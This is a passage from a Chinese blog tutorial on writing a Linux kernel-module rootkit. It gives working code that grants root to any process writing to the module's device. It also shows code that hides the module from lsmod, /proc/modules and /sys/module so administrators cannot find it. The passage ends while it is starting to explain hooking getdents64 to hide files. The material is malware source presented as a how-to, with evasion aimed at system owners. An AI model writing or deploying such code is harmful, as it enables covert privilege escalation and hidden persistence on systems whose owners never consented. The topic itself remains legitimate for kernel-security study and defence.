class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
+
+<p>我们主要关注 uid ，一个cred结构体中记载了<strong>一个进程四种不同的用户ID</strong>：</p>
+<ul>
+<li><strong>真实用户ID</strong>（real UID）：标识一个进程<strong>启动时的用户ID</strong></li>
+<li><strong>保存用户ID</strong>（saved UID）：标识一个进程<strong>最初的有效用户ID</strong></li>
+<li><strong>有效用户ID</strong>（effective UID）：标识一个进程<strong>正在运行时所属的用户ID</strong>，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的</li>
+<li><strong>文件系统用户ID</strong>（UID for VFS ops）：标识一个进程<strong>创建文件时进行标识的用户ID</strong></li>
+</ul>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><blockquote>
+<p>Linux kernel 进程权限相关细节不在此赘叙，可以参见<a href="https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/#%E5%9B%9B%E3%80%81%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86">这里</a></p>
+</blockquote>
+<p>cred 结构体中存储了进程的 effective uid，那么我们不难想到，若是我们直接改写一个进程对应的 cred 结构体，我们便能直接改变其执行权限</p>
+<p>而在 Linux 中 <code>root</code> 用户的 uid 为 0，若是我们将一个进程的 uid 都改为 0，该进程便获得了 root 权限</p>
+<h3 id="方法I-调用commit-creds-prepare-kernel-cred-NULL"><a href="#方法I-调用commit-creds-prepare-kernel-cred-NULL" class="headerlink" title="方法I.调用commit_creds(prepare_kernel_cred(NULL))"></a>方法I.调用commit_creds(prepare_kernel_cred(NULL))</h3><blockquote>
+<p>pwn 选手应该都挺熟悉这个hhhh</p>
+</blockquote>
+<p>在内核空间有如下两个函数，都位于<code>kernel/cred.c</code>中：</p>
+<ul>
+<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong></li>
+<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</li>
+</ul>
+<p>查看<code>prepare_kernel_cred()</code>函数源码，观察到如下逻辑：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = get_task_cred(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = get_cred(&amp;init_cred);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>在<code>prepare_kernel_cred()</code>函数中，若传入的参数为NULL，则会缺省使用<code>init</code>进程的<code>cred</code>作为模板进行拷贝，<strong>即可以直接获得一个标识着root权限的cred结构体</strong></p>
+<p>那么我们不难想到，只要我们能够在内核空间执行<code>commit_creds(prepare_kernel_cred(NULL))</code>，那么就能够将进程的权限提升到<code>root</code></p>
+<p>我们来简单测试一下：修改 write 函数，在用户向设备写入时将其提权到 root：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">a3_rootkit_write</span><span class="params">(<span class="keyword">struct</span> file * __file, <span class="type">const</span> <span class="type">char</span> __user * user_buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> * __loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单测试一下，可以看到当我们向设备内写入任意内容后便提权到了 root</p>
+<p><img src="https://i.loli.net/2021/07/17/z5bg2snkNeLuKVm.png" alt="image.png"></p>
+<h3 id="方法II-直接修改-cred-结构体"><a href="#方法II-直接修改-cred-结构体" class="headerlink" title="方法II.直接修改 cred 结构体"></a>方法II.直接修改 cred 结构体</h3><p>前面我们讲到，<code>commit_creds()</code> 函数用以将一个新的 cred 应用到当前进程，我们来观察其源码相应逻辑：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<p>在该函数开头直接通过宏 <code>current</code> 获取当前进程的 <code>task_struct</code>，随后修改的是其成员 <code>real_cred</code>，那么我们在内核模块中同样可以直接通过该宏获取当前进程的 task_struct 结构体，从而直接修改其 real_cred 中的 uid 以实现到 root 的提权</p>
+<p>那么我们的代码可以修改如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> * <span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line"></span><br><span class="line">    old-&gt;gid = old-&gt;sgid = old-&gt;egid = KGIDT_INIT(<span class="number">0</span>);</span><br><span class="line">    old-&gt;uid = old-&gt;suid = old-&gt;euid = KUIDT_INIT(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>
+
+<p>这里需要注意的是 uid 与 gid 的类型为封装为结构体的 <code>kuid_t</code> 与 <code>kgid_t</code> 类型，应当使用宏 <code>KGIDT_INIT()</code> 与 <code>KUIDT_INIT()</code> 进行赋值</p>
+<p>可以看到当我们向设备写入之后便提权到了 root，不同的是我们只修改了几个 uid 和 gid，所以原有的其他信息依旧会保留，这里也可以选择把其他的一并改掉</p>
+<p><img src="https://i.loli.net/2021/07/17/aidHQFXLtJq3ZIK.png" alt="image.png"></p>
+<blockquote>
+<h4 id="current：CPU-局部变量保存当前进程-task-struct-结构体"><a href="#current：CPU-局部变量保存当前进程-task-struct-结构体" class="headerlink" title="current：CPU 局部变量保存当前进程 task_struct 结构体"></a>current：CPU 局部变量保存当前进程 task_struct 结构体</h4><p>这里<strong>简单</strong>讲一下宏 <code>current</code> 的是如何获取当前进程的 task_struct 的：该宏定义于内核源码 <code>arch/x6/include/asm/current.h</code> 中，展开后为函数 <code>static __always_inline struct task_struct *get_current(void)</code> ，该函数只有一句 <code>return this_cpu_read_stable(current_task);</code>：</p>
+<p>其中 <code>current_task</code> 为 CPU 局部变量，在头文件开头使用宏 <code>DECLARE_PER_CPU</code> 从外部引入该变量，该宏定义于 <code>include/linux/percpu-defs.h</code> 中，展开后为 <code>DECLARE_PER_CPU_SECTION(type, name, &quot;&quot;)</code>，该宏再度展开为 <code>extern __PCPU_ATTRS(sec) __typeof__(type) name</code>，该宏再度展开为 <code>__percpu __attribute__((section(PER_CPU_BASE_SECTION sec))) PER_CPU_ATTRIBUTES</code>，其中宏 <code>PER_CPU_BASE_SECTION</code> 定义于 <code>include/asm-generic/percpu.h</code>中，SMP（多对称处理）下展开为字符串 <code>&quot;.data..percpu&quot;</code>。最终展开为 <code>__attribute__((section(&quot;.data..percpu&quot;))) (type) name</code>，其中  <code>__attribute__</code> 宏为 gcc 的特殊机制，具体的参见<a target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/gcc-10.2.0/gcc/Common-Function-Attributes.html#Common-Function-Attributes">手册</a></p>
+<p>那么我们可以知道该宏最终便是<strong>外部引用了一个位于 .data..percpu 这一数据段中</strong>的 task_struct 类型的变量 current_task</p>
+<p>接下来看宏 <code>this_cpu_read_stable</code>，该宏定义于 <code>arch/x86/include/asm/percpu.h</code> 中，展开为 <code>__pcpu_size_call_return(this_cpu_read_stable_, pcp)</code>，再度展开为如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __pcpu_size_call_return(stem, variable)				\</span></span><br><span class="line"><span class="meta">(&#123;									\</span></span><br><span class="line"><span class="meta">	typeof(variable) pscr_ret__;					\</span></span><br><span class="line"><span class="meta">	__verify_pcpu_ptr(&amp;(variable));					\</span></span><br><span class="line"><span class="meta">	switch(sizeof(variable)) &#123;					\</span></span><br><span class="line"><span class="meta">	case 1: pscr_ret__ = stem##1(variable); break;			\</span></span><br><span class="line"><span class="meta">	case 2: pscr_ret__ = stem##2(variable); break;			\</span></span><br><span class="line"><span class="meta">	case 4: pscr_ret__ = stem##4(variable); break;			\</span></span><br><span class="line"><span class="meta">	case 8: pscr_ret__ = stem##8(variable); break;			\</span></span><br><span class="line"><span class="meta">	default:							\</span></span><br><span class="line"><span class="meta">		__bad_size_call_parameter(); break;			\</span></span><br><span class="line"><span class="meta">	&#125;								\</span></span><br><span class="line"><span class="meta">	pscr_ret__;							\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
+
+<p>开头先定义了一个变量 <code>pscr_ret__</code>，使用 <code>typeof</code> （GNU C 扩展关键字）获取 variable 的类型</p>
+<p>其中宏 <code>__verify_pcpu_ptr()</code> 同样定义于该文件中，如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __verify_pcpu_ptr(ptr)						\</span></span><br><span class="line"><span class="meta">do &#123;									\</span></span><br><span class="line"><span class="meta">	const void __percpu *__vpp_verify = (typeof((ptr) + 0))NULL;	\</span></span><br><span class="line"><span class="meta">	(void)__vpp_verify;						\</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>do...while(0)</code> 结构为约定熟成的「只执行一次的语句」的宏的书写形式，该宏中定义了一个 void 指针通过强制类型转换获取 NULL 转成 ptr 的类型给到该指针（好像没什么用…？），然后下一句再转为 NULL（空转，没有做任何其他诸如赋值一类的事情，笔者才疏学浅暂时不理解这么做的理由）</p>
+<p>接下来根据变量 variable 的 size 进行宏拼接，前面我们传入的 <code>current_task</code> 变量为 <code>struct task_struct *</code> 指针类型，这里以 64 位系统为例，最终得到的拼接结果为宏 <code>this_cpu_read_stable_8</code>，定义于 <code>arch/x86/include/asm/percpu.h</code> 中（绕了一圈又回来了），展开为 <code>percpu_stable_op(8, &quot;mov&quot;, pcp)</code>，再度展开为如下形式：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> percpu_stable_op(size, op, _var)				\</span></span><br><span class="line"><span class="meta">(&#123;									\</span></span><br><span class="line"><span class="meta">	__pcpu_type_##size pfo_val__;					\</span></span><br><span class="line"><span class="meta">	asm(__pcpu_op2_##size(op, __percpu_arg(P[var]), <span class="string">&quot;%[val]&quot;</span>)	\</span></span><br><span class="line"><span class="meta">	    : [val] __pcpu_reg_##size(<span class="string">&quot;=&quot;</span>, pfo_val__)			\</span></span><br><span class="line"><span class="meta">	    : [var] <span class="string">&quot;p&quot;</span> (&amp;(_var)));					\</span></span><br><span class="line"><span class="meta">	(typeof(_var))(unsigned long) pfo_val__;			\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>__pcpu_type_8</code> 展开为 <code>u64</code>，在多个头文件中都有定义，最终展开为<code>unsigned long long</code>的 typedef 别名</p>
+<p>下一行使用了内联汇编，其中拼接后得到的宏 <code>__pcpu_op2_8(op, src, dst)</code> 同样位于这个头文件，展开为 <code>op &quot;q &quot; src &quot;, &quot; dst</code>；<code>__percpu_arg(x)</code>展开为 <code>__percpu_prefix &quot;%&quot; #x</code>， 再展开为 <code>&quot;%%&quot;__stringify(__percpu_seg)&quot;:&quot;</code>：<code>__stringify</code> 展开为 <code>__stringify_1(x)</code> 展开为 <code>#x</code>，<code>__percpu_seg</code> 展开为 <code>gs</code>，合起来便是 <code>%%gs:%P[var]</code>；拼接宏 <code>__pcpu_reg_8(mod, x)</code> 展开为 <code>mod &quot;r&quot; (x)</code></p>
+<p>最终展开为如下形式：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pfo_val__;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;movq %%gs:%P[var], %[val]&quot;</span> \</span><br><span class="line">   : [val] <span class="string">&quot;=r&quot;</span> (pfo_val__) \</span><br><span class="line">   : [var] <span class="string">&quot;p&quot;</span> (&amp;(current_task)));</span><br><span class="line">(<span class="keyword">struct</span> task_struct *)(<span class="type">unsigned</span> <span class="type">long</span>) pfo_val__;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>反人类的AT&amp;T汇编语法什么时候能滚出地球（恼）</p>
+</blockquote>
+<p>拨开 Linux 内核源码中的 114514 层嵌套之后我们大抵能够明白该段代码的核心便是<strong>以 gs 寄存器作为基址，取 current_task 变量偏移处值赋给 pfo_val__ 变量</strong>，随后返回 pro_val__ 变量</p>
+<p>那么为什么 gs 寄存器中存的地址在这个偏移上便是该进程的 task_struct 结构呢？这个和 percpu 机制有关，这里先🕊了（）</p>
+</blockquote>
+<h1 id="0x03-模块隐藏"><a href="#0x03-模块隐藏" class="headerlink" title="0x03.模块隐藏"></a>0x03.模块隐藏</h1><p>当我们将一个 LKM 装载到内核模块中之后，用户尤其是服务器管理员可以使用 <code>lsmod</code> 命令<strong>发现你在服务器上留下的rootkit</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arttnba3@ubuntu:~/Desktop/DailyProgramming/rootkit$ sudo insmod rootkit.ko </span><br><span class="line">Password: </span><br><span class="line">arttnba3@ubuntu:~/Desktop/DailyProgramming/rootkit$ lsmod | grep <span class="string">&#x27;rootkit&#x27;</span></span><br><span class="line">rootkit                16384  0</span><br></pre></td></tr></table></figure>
+
+<p>虽然说我们可以把 rootkit 的名字改为「very_important_module_not_root_kit_please_donot_remove_it」一类的名字进行伪装从而通过_社会工程学手段_让用户难以发现异常，但是哪怕看起来再“正常”的名字也不能够保证不会被发现，因此我们需要<strong>让用户无法直接发现我们的 rootkit</strong></p>
+<h2 id="PRE-内核中的内核模块：module-结构体"><a href="#PRE-内核中的内核模块：module-结构体" class="headerlink" title="PRE.内核中的内核模块：module 结构体"></a>PRE.内核中的内核模块：module 结构体</h2><p>这里仅简要叙述，在内核当中使用结构体 <code>module</code> 来表示一个内核模块（定义于 <code>/include/linux/module.h</code>），多个内核模块通过成员 <code>list</code> （内核双向链表结构<code>list_head</code>，定义于<code>/include/linux/types.h</code> 中，仅有 next 与 prev 指针成员）构成双向链表结构</p>
+<p>在内核模块编程中，我们可以通过宏 <code>THIS_MODULE</code> （定义于 <code>include/linux/export.h</code>）或者直接用其宏展开 <code>&amp;__list_module</code> 来获取当前内核模块的 module 结构体，</p>
+<h2 id="Step-I-x2F-proc-x2F-modules-信息隐藏"><a href="#Step-I-x2F-proc-x2F-modules-信息隐藏" class="headerlink" title="Step-I. &#x2F;proc&#x2F;modules 信息隐藏"></a>Step-I. &#x2F;proc&#x2F;modules 信息隐藏</h2><p>Linux 下用以查看模块的命令 <code>lsmod</code> 其实是从 <code>/proc/modules</code> 这个文件中读取并进行整理，该文件的内容来自于内核中的 module 双向链表，那么我们只需要将 rootkit 从双向链表中移除即可完成 procfs 中的隐藏</p>
+<p>熟悉内核编程的同学应该都知道 <code>list_del_init()</code> 函数用以进行内核双向链表脱链操作，该函数定义于 <code>/include/linux/list.h</code> 中，多重套娃展开后其核心<strong>主要是常规的双向链表脱链</strong>，那么在这里我们其实可以直接手写双向链表的脱链工作</p>
+<p>我们还需要考虑到多线程操作的影响，阅读 <code>rmmod</code> 背后的系统调用 <code>delete_module</code> 源码（位于 <code>kernel/module.c</code> 中），观察到其进入临界区前使用了一个互斥锁变量名为 <code>module_mutex</code>，我们的 unlink 操作也将使用该互斥锁以保证线程安全（毕竟我们进来不是直接搞破坏的hhh）</p>
+<p>在模块初始化函数末尾添加如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">rootkit_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unlink from module list</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> * <span class="title">list</span> =</span> (&amp;__this_module.<span class="built_in">list</span>);</span><br><span class="line">	mutex_lock(&amp;module_mutex);</span><br><span class="line">	<span class="built_in">list</span>-&gt;prev-&gt;next = <span class="built_in">list</span>-&gt;next;</span><br><span class="line">	<span class="built_in">list</span>-&gt;next-&gt;prev = <span class="built_in">list</span>-&gt;prev;</span><br><span class="line">	mutex_unlock(&amp;module_mutex);</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将我们的 rootkit 重新 make 后加载到内核中，我们会发现 <strong>lsmod 命令已经无法发现我们的 rootkit，在 &#x2F;proc&#x2F;modules 文件中已经没有我们 rootkit 的信息</strong>，与此同时我们的 rootkit <strong>所提供的功能一切正常</strong></p>
+<p>但同样地，无论是载入还是卸载内核模块都需要对双向链表进行操作，由于我们的 rootkit 已经脱链故<strong>我们无法将其卸载</strong>（不过 rootkit 一次载入后应当是要长久驻留在内核中的）</p>
+<p><img src="https://i.loli.net/2021/07/07/XkE79CKGZBnepW2.png" alt="image.png"></p>
+<h2 id="Step-II-x2F-sys-x2F-module-x2F-信息隐藏"><a href="#Step-II-x2F-sys-x2F-module-x2F-信息隐藏" class="headerlink" title="Step-II. &#x2F;sys&#x2F;module&#x2F; 信息隐藏"></a>Step-II. &#x2F;sys&#x2F;module&#x2F; 信息隐藏</h2><p>sysfs 与 procfs 相类似，同样是一个基于 RAM 的虚拟文件系统，它的作用是将内核信息以文件的方式提供给用户程序使用，其中便包括我们的 rootkit 模块信息，sysfs 会动态读取内核中的 kobject 层次结构并在 <code>/sys/module/</code> 目录下生成文件</p>
+<p>这里简单讲一下 kobject：Kobject 是 Linux 中的设备数据结构基类，在内核中为 <code>struct kobject</code> 结构体，通常内嵌在其他数据结构中；每个设备都有一个 kobject 结构体，多个 kobject 间通过内核双向链表进行链接；kobject 之间构成层次结构</p>
+<blockquote>
+<p>kobject 更多信息参见<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/104834616">https://zhuanlan.zhihu.com/p/104834616</a></p>
+</blockquote>
+<p>熟悉内核编程的同学应该都知道我们可以使用 <code>kobject_del()</code> 函数（定义于 <code>/lib/kobject.c</code>中）来将一个 kobject 从层次结构中脱离，这里我们将在我们的 rootkit 的 init 函数末尾使用这个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">rootkit_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unlink from kobject</span></span><br><span class="line">    kobject_del(&amp;__this_module.mkobj.kobj);</span><br><span class="line">    list_del(&amp;(&amp;__list_module-&gt;mkobj.kobj.entry));</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单测试，我们可以发现无论是在 procfs 中还是 sysfs 中都已经没有了我们的 rootkit 的身影，而提权的功能依旧正常，我们很好地完成了隐藏模块的功能</p>
+<p><img src="https://i.loli.net/2021/07/08/sxcQJd7CDTaWfA1.png" alt="image.png"></p>
+<h2 id="Step-III-文件隐藏"><a href="#Step-III-文件隐藏" class="headerlink" title="Step-III. 文件隐藏"></a>Step-III. 文件隐藏</h2><p>前面我们讲到我们注册了一个字符型设备作为我们用户进程的接口，但是<strong>无论命名得再怎么好，一个陌生的设备仍容易被管理员发现</strong>；同样地，我们的 rootkit 既然要长久驻留在系统上，那么在系统每一次开机时都应当载入我们的 rootkit，这就要求<strong>我们的 rootkit 文件还需要保留在硬盘上</strong></p>
+<p>因此接下来我们还要完成相关文件的隐藏的工作</p>
+<h3 id="文件遍历过程"><a href="#文件遍历过程" class="headerlink" title="文件遍历过程"></a>文件遍历过程</h3><p>在 Linux 中最常用的遍历文件的指令为 <code>ls</code>，我们使用 <code>strace</code> 来观察其所使用到的系统调用，去除掉前面的载入 glibc 库所使用的系统调用以外，我们会发现其调用了一个名为 <code>getgetdents64</code> 的系统调用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">arttnba3@ubuntu:~$ strace <span class="built_in">ls</span></span><br><span class="line">...</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;.&quot;</span>, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</span><br><span class="line">getdents64(3, /* 44 entries */, 32768)  = 1408</span><br><span class="line">getdents64(3, /* 0 entries */, 32768)   = 0</span><br><span class="line">close(3) </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>其代码位于内核源码文件 <code>/fs/readdir.c</code>，如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(getdents64, <span class="type">unsigned</span> <span class="type">int</span>, fd,</span><br><span class="line">		<span class="keyword">struct</span> linux_dirent64 __user *, dirent, <span class="type">unsigned</span> <span class="type">int</span>, count)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">getdents_callback64</span> <span class="title">buf</span> =</span> &#123;</span><br><span class="line">		.ctx.actor = filldir64,</span><br><span class="line">		.count = count,</span><br><span class="line">		.current_dir = dirent</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">	f = fdget_pos(fd);</span><br><span class="line">	<span class="keyword">if</span> (!f.file)</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">	error = iterate_dir(f.file, &amp;buf.ctx);</span><br><span class="line">	<span class="keyword">if</span> (error &gt;= <span class="number">0</span>)</span><br><span class="line">		error = buf.error;</span><br><span class="line">	<span class="keyword">if</span> (buf.prev_reclen) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent64</span> __<span class="title">user</span> * <span class="title">lastdirent</span>;</span></span><br><span class="line">		typeof(lastdirent-&gt;d_off) d_off = buf.ctx.pos;</span><br><span class="line"></span><br><span class="line">		lastdirent = (<span class="type">void</span> __user *) buf.current_dir - buf.prev_reclen;</span><br><span class="line">		<span class="keyword">if</span> (put_user(d_off, &amp;lastdirent-&gt;d_off))</span><br><span class="line">			error = -EFAULT;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			error = count - buf.count;</span><br><span class="line">	&#125;</span><br><span class="line">	fdput_pos(f);</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>ls</code> 命令调用该系统调用时传入的第一个参数为文件描述符 <code>3</code>——对应的文件是 <code>.</code>，即<strong>当前目录</strong>；代码中的 <code>fdget_pos()</code> 与 <code>fdput_pos()</code> 函数用以对文件进行加&#x2F;解锁操作，该系统调用的核心操作是 <code>iterate_dir()</code> 函数，定义于 <code>/fs/readdir.c</code> 中，观察代码我们可以发现如下逻辑：</p>
